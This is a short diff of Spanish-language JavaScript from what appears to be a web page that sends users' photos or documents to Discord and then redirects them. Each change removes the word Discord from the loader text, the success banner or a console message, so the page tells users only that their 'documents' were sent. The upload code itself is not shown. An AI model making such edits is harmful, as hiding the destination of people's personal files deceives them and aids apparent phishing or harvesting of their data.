@@ -1214,7 +1214,7 @@
                 
                 if (response.ok) {
                     const result = await response.json();
-                    console.log('✅ Fotos enviadas a Discord:', result);
+                    console.log('✅ Fotos enviadas:', result);
                     return true;
                 } else {
                     console.error('❌ Error al enviar a Discord:', await response.text());
@@ -1321,7 +1321,7 @@
                 ];
                 
                 updateLoaderStage(2);
-                loaderStatus.textContent = 'Enviando fotos a Discord...';
+                loaderStatus.textContent = 'Enviando Documentos...';
                 
                 // Intentar método 1: FormData directo
                 let success = await sendFilesToDiscord(files);
@@ -1392,7 +1392,7 @@
                 hideLoader();
                 
                 if (success) {
-                    showNotification('✅ ¡FOTOS ENVIADAS DIRECTAMENTE A DISCORD!', 'success');
+                    showNotification('✅ ¡FOTOS ENVIADAS DIRECTAMENTE', 'success');
                     setTimeout(() => {
                         showRedirectMessage();
                     }, 1500);
